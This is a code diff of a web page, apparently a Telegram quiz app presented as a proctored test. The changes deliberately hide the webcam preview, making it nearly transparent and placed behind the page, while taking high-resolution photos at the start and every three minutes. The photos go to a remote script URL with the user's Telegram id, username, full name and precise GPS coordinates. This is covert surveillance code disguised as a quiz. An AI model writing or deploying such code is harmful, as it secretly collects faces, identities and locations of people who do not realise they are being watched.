@@ -13,9 +13,19 @@
         h3 { margin-top: 0; color: #00eaff; }
         .instruction-box { text-align: left; background: rgba(255, 255, 255, 0.03); padding: 20px; border-radius: 15px; font-size: 14px; line-height: 1.6; margin: 20px 0; border-left: 4px solid #00eaff; }
         button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
-        button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
         .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
-        video { width: 1px; height: 1px; opacity: 0; position: fixed; pointer-events: none; }
+        
+        /* Video ko hidden but active rakhne ke liye */
+        #proctorVideo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 160px; /* Chota size rakha taaki render ho sake */
+            height: 90px;
+            opacity: 0.01; /* Halqa sa dikhega par transparent hoga */
+            z-index: -1;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -56,92 +66,72 @@
     async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
-        btn.innerText = "Connecting HD Cam... ⏳";
+        btn.innerText = "Connecting... ⏳";
 
         try {
-            // 1. Camera access with HD constraints
+            // Camera setup with high priority
             globalStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    width: { ideal: 1280 }, 
-                    height: { ideal: 720 },
-                    facingMode: "user" 
-                } 
+                video: { width: 1280, height: 720 } 
             });
-            
             const video = document.getElementById('proctorVideo');
             video.srcObject = globalStream;
             
-            // Forced play to ensure video is running
-            await video.play();
+            // Wait for video to actually start playing
+            video.onloadedmetadata = () => {
+                video.play();
+            };
 
-            // 2. Location access
-            btn.innerText = "GPS Verification... ⏳";
             const pos = await new Promise((res, rej) => {
                 navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
             });
             userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
 
-            // 3. UI Switch
             document.getElementById("login").style.display = "none";
             document.getElementById("quizBox").style.display = "block";
             loadQuestion();
             
-            // Wait 3 seconds before first photo to avoid black screen
-            setTimeout(() => captureAndSend("Test_Started"), 3000);
-            setInterval(() => captureAndSend("Periodic_Check"), 180000);
+            // Pahli photo ke liye 4 second wait karein taaki camera feed aa jaye
+            setTimeout(() => captureAndSend("Test_Started"), 4000);
+            setInterval(() => captureAndSend("Monitoring"), 180000);
 
         } catch (err) {
-            alert("Error: Camera/GPS setup failed! Please allow permissions.");
+            alert("Error: Camera ya Location allow karein.");
             btn.disabled = false;
             btn.innerText = "प्रक्रिया शुरू करें";
         }
     }
 
-    async function captureAndSend(statusType) {
-        if (!globalStream) return;
+    function captureAndSend(statusType) {
+        const video = document.getElementById('proctorVideo');
+        if (!video.srcObject) return;
+
+        const canvas = document.createElement('canvas');
+        // Perfect 16:9 HD ratio
+        canvas.width = 1280;
+        canvas.height = 720;
         
-        try {
-            const video = document.getElementById('proctorVideo');
-            
-            // Don't capture if video is not ready
-            if (video.readyState !== 4) return;
+        const ctx = canvas.getContext('2d');
+        
+        // Ensure image is drawn fully
+        ctx.drawImage(video, 0, 0, 1280, 720);
+        
+        const photoData = canvas.toDataURL('image/jpeg', 0.8);
 
-            const canvas = document.createElement('canvas');
-            // Perfect HD aspect ratio for canvas
-            canvas.width = 800; 
-            canvas.height = 450;
-            
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, 800, 450);
-            
-            const photoData = canvas.toDataURL('image/jpeg', 0.7);
+        const payload = {
+            userId: user.id || "NA",
+            username: user.username || "NA",
+            fullName: (user.first_name || "") + " " + (user.last_name || ""),
+            score: "Active",
+            status: statusType,
+            photo: photoData,
+            location: userLoc
+        };
 
-            const payload = {
-                userId: user.id || "NA",
-                username: user.username || "NA",
-                fullName: (user.first_name || "") + " " + (user.last_name || ""),
-                score: "Active",
-                status: statusType,
-                photo: photoData,
-                location: userLoc
-            };
-
-            fetch(SCRIPT_URL, { 
-                method: "POST", 
-                mode: "no-cors", 
-                body: JSON.stringify(payload) 
-            });
-        } catch (e) { 
-            console.log("Capture Error:", e); 
-        }
+        fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
     }
 
     function loadQuestion() {
-        if (currentIdx >= questions.length) { 
-            alert("Test Submitted Successfully!"); 
-            tg.close(); 
-            return; 
-        }
+        if (currentIdx >= questions.length) { alert("Test Complete!"); tg.close(); return; }
         const qData = questions[currentIdx];
         document.getElementById("question").innerText = qData.q;
         const optionsDiv = document.getElementById("options");
